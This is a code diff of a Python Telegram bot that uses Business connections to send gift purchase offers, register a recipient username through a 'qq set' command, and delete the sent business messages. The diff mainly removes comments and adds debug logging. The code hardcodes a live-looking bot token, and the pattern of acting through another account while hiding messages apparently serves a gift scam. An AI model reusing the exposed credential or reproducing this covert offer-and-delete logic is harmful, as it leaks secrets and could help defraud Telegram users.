@@ -9,8 +9,6 @@ from aiogram.exceptions import TelegramRetryAfter
 
 TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
 
-# bcid -> recipient username (без @)
-# Заполняется командой: qq set @username
 _recipients: dict[str, str] = {}
 
 logging.basicConfig(level=logging.INFO)
@@ -19,7 +17,7 @@ dp = Dispatcher(storage=MemoryStorage())
 
 message_queue = asyncio.Queue()
 client_user_ids = {}
-_bcid_store: dict[str, dict] = {}  # "chat_id:message_id" -> {bcid, chat_id}
+_bcid_store: dict[str, dict] = {}
 
 LOCALES = {
     "ru": {
@@ -59,12 +57,10 @@ LOCALES = {
 def build_offer_text(gift_name, gift_num, amount, currency_type, lang):
     slug = gift_name.replace(" ", "")
     loc = LOCALES.get(lang, LOCALES["ru"])
-
     if currency_type.lower() == "gram":
         currency_emoji = '<tg-emoji emoji-id="5298988357538328017">💎</tg-emoji>'
     else:
         currency_emoji = '<tg-emoji emoji-id="5920433463428650761">⭐️</tg-emoji>'
-
     return loc["offer_text"].format(
         amount=amount,
         currency_emoji=currency_emoji,
@@ -78,7 +74,6 @@ def make_offer_keyboard(gift_name, gift_num, amount, currency_type, lang):
     slug = gift_name.replace(" ", "")
     cb_data = f"a|{slug}|{gift_num}|{amount}|{currency_type}|{lang}"
     decline_data = f"d|{gift_num}"
-
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [
@@ -105,7 +100,6 @@ async def handle_private_start(message: Message):
 async def handle_business_command(message: Message):
     if not message.text:
         return
-
     text_clean = message.text.strip()
     if not text_clean.lower().startswith("qq"):
         return
@@ -113,7 +107,6 @@ async def handle_business_command(message: Message):
     parts = text_clean.split()
     bcid = message.business_connection_id
 
-    # qq set @username — регистрирует получателя для этого аккаунта
     if len(parts) == 3 and parts[1].lower() == "set":
         username = parts[2].lstrip("@")
         if bcid:
@@ -193,7 +186,6 @@ async def accept_offer(cb: CallbackQuery):
 
     _, slug, gift_num_str, amount, currency_type, lang = parts
     gift_num = int(gift_num_str)
-
     currency_name = "Gram" if currency_type.lower() == "gram" else "Stars"
 
     gift_emoji = '<tg-emoji emoji-id="5985472565508838112">🎁</tg-emoji>'
@@ -206,11 +198,17 @@ async def accept_offer(cb: CallbackQuery):
 
     cb_chat_id = cb.message.chat.id
     message_id = cb.message.message_id
-    stored    = _bcid_store.get(f"{cb_chat_id}:{message_id}")
+    store_key = f"{cb_chat_id}:{message_id}"
+    stored = _bcid_store.get(store_key)
+
+    logging.warning(f"[ACCEPT] store_key={store_key} stored={stored} bcid_store_keys={list(_bcid_store.keys())}")
+
     bcid      = stored["bcid"]      if stored else None
     chat_id   = stored["chat_id"]   if stored else cb_chat_id
     recipient = stored["recipient"] if stored else "recipient_username"
     lang      = stored.get("lang", lang) if stored else lang
+
+    logging.warning(f"[ACCEPT] chat_id={chat_id} bcid={bcid} recipient={recipient} lang={lang}")
 
     await cb.answer("✅ Успешно принято!", show_alert=True)
 
@@ -260,12 +258,14 @@ async def sender_worker():
             )
 
             if task["bcid"] and sent_msg:
-                _bcid_store[f"{task['chat_id']}:{sent_msg.message_id}"] = {
+                store_key = f"{task['chat_id']}:{sent_msg.message_id}"
+                _bcid_store[store_key] = {
                     "bcid": task["bcid"],
                     "chat_id": task["chat_id"],
                     "recipient": task["recipient"],
                     "lang": task["lang"],
                 }
+                logging.warning(f"[STORE] saved key={store_key} bcid={task['bcid']}")
                 try:
                     await bot.delete_business_messages(
                         business_connection_id=task["bcid"],
